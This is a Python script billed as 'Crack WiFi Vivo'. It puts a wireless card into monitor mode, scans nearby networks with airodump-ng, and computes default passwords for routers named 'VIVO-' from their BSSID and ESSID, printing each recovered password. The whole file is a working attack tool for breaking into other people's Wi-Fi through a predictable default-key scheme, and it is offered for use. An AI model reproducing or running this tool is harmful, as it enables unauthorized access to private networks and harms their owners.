#!/usr/bin/env python
# -*- coding: utf-8 -*-

import csv, apt
import sys
import os
import subprocess
import time
from services import Logging
import argparse

def parse_args():
    """
    Creating an ArgumentParser

    :return: ArgumentParser
    """

    parser = argparse.ArgumentParser(description='Crack WiFi Vivo')

    parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')
    required.add_argument('-i', '--interface', required=True, help='Network interface that will be used as a monitor')
    
    try:
        return parser.parse_args()
    except SystemExit:
        sys.exit(0)

class TryAgain(Logging):

    def __init__(self, args):
        super(TryAgain, self).__init__()
        self.args = vars(args)
        self.networksDataCsv = "networks"

    def run(self):

        print('''
             _____              _               _       
            |_   _| __ _   _   / \   __ _  __ _(_)_ __  
              | || '__| | | | / _ \ / _` |/ _` | | '_ \ 
              | || |  | |_| |/ ___ \ (_| | (_| | | | | |
              |_||_|   \__, /_/   \_\__, |\__,_|_|_| |_|
                       |___/        |___/               
            coded by @dyegocaldeira
        ''')
        
        f = os.popen("sudo airmon-ng check kill &> /dev/null")

        self.validateSudo()
        self.checkInet()
        self.checkDependencies()
        self.getNetworks()
        self.crackThis()

    def validateSudo(self):

        if not 'SUDO_UID' in os.environ.keys():
            self.log("Run it as root\n", 'ERROR')
            sys.exit(1)

    def checkInet(self):

        proc1 = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)
        proc2 = subprocess.Popen(['grep', self.args['interface']], stdin=proc1.stdout, stdout=subprocess.PIPE)
        proc3 = subprocess.Popen(['wc', '-l'], stdin=proc2.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        proc1.stdout.close()
        proc2.stdout.close()
        
        if "0" in str(proc3.communicate()[0]):

            self.log("Interface does not exist!", 'ERROR', True)
            print("\n")
            sys.exit(1)
        
        if "mon" not in str(self.args['interface']):
            self.startMon()

    def startMon(self):

        self.log('Checking monitor interface...', flush=True)
        
        proc1 = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)
        proc2 = subprocess.Popen(['grep', 'mon'], stdin=proc1.stdout, stdout=subprocess.PIPE)
        proc3 = subprocess.Popen(['wc', '-l'], stdin=proc2.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        proc1.stdout.close()
        proc2.stdout.close()

        if "0" in str(proc3.communicate()[0]):

            startCmd = "sudo airmon-ng start {interface}".format(interface=self.args['interface'])
            # os.system(startCmd)
            f = os.popen(startCmd)

        time.sleep(2)

        newProc1 = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)
        newProc2 = subprocess.Popen(['grep', 'mon'], stdin=newProc1.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        newProc1.stdout.close()

        self.log('Monitor interface: [OK]      ', level='SUCCESS')

        self.args['interface'] = str(newProc2.communicate()).split(" ")[0].split("'")[1]

    def installDependencies(self, PKG, CACHE):

        self.log('Installing dependencies...', 'WARNING', True, flush=True)

        PKG.mark_install()

        try:
            CACHE.commit()

            self.log('Dependencies: [OK]        ', 'SUCCESS')
        except (Exception, arg):
            print >> sys.stderr, "Sorry, package installation failed [{err}]".format(err=str(arg))

    def checkDependencies(self):

        self.log('Checking dependencies...', flush=True)
        
        try:
            PKG_NAME = "aircrack-ng"
            CACHE = apt.cache.Cache()
            # CACHE.update()
        
            CACHE.open()
            PKG = CACHE[PKG_NAME]

            if PKG.is_installed:
                # print "{PKG_NAME} already installed".format(PKG_NAME=PKG_NAME)
                self.log('Dependencies: [OK]      ', 'SUCCESS')
            else:

                # self.installDependencies(PKG, CACHE)
                self.log('aircrack-ng not found. Run to install and try again: sudo apt install aircrack-ng -y', 'ERROR')
                sys.exit(1)
        except KeyboardInterrupt:
            self.exit()

    def getNetworks(self):

        self.checkAndDeleteArchivesDirectory()

        self.log('Starting the monitor to get networks, press Ctrl + C when you find enough')
        try:
            time.sleep(5)
            scanNetworksCmd = "sudo airodump-ng -w networks --output-format csv " + self.args['interface']
            os.system(scanNetworksCmd)
        except KeyboardInterrupt:
            self.exit()

    def checkAndDeleteArchivesDirectory(self):

        try:
            proc1 = subprocess.Popen(['ls'], stdout=subprocess.PIPE)
            proc2 = subprocess.Popen(['grep', self.networksDataCsv+'-*'], stdin=proc1.stdout, stdout=subprocess.PIPE)
            proc3 = subprocess.Popen(['wc', '-l'], stdin=proc2.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            proc1.stdout.close()
            proc2.stdout.close()
            
            if "0" in str(proc3.communicate()[0]):
                pass
            else:  
                os.system('rm -rf networks-*')
        except KeyboardInterrupt:
            self.exit()

    def crackThis(self):

        self.log('Starging cracking...')

        time.sleep(2)
        countCracked=0

        with open(str(self.networksDataCsv + "-01.csv")) as csvFile:

            try:
                csvReader = csv.reader(csvFile)

                for row in csvReader:

                    if not row:
                        pass
                    else:

                        if row[0] == 'Station MAC':
                            break

                        dicio = {'BSSID': row[0], 'ESSID': row[13]}

                        if dicio['BSSID'] == 'BSSID':
                            pass
                        else:
                            if 'VIVO-' in dicio['ESSID']:

                                password = dicio['BSSID'][3:-5].replace(':', '') + dicio['ESSID'][6:]
                                passMsg = 'Network [' + dicio['ESSID'].strip() +'] Password: ' + password
                                countCracked += 1
                                self.log(passMsg, 'SUCCESS')
                
                if countCracked == 0:
                    self.log('Sorry, no Vivo network found', 'WARNING')
                    cmd="sudo airmon-ng stop {inet} &> /dev/null".format(inet=self.args['interface'])
                    f = os.popen(cmd)
                    time.sleep(2)

            finally:

                os.system("sudo systemctl restart network-manager &> /dev/null")
                print('\n')
                csvFile.close()

    def exit(self):

        self.log('Action canceled by user', 'WARNING')
        self.log('Restarting network-manager')
        self.log('Stopping monitor interface')

        os.system("sudo systemctl restart network-manager &> /dev/null")
        time.sleep(2)
        stopMonCmd="sudo airmon-ng stop {inet} &> /dev/null".format(inet=self.args['interface'])
        f = os.popen(stopMonCmd)
        print('\n')
        
        try:
            sys.exit(1)
        except SystemExit:
            os._exit(1)

if __name__ == '__main__':
    start = TryAgain(parse_args())
    start.run()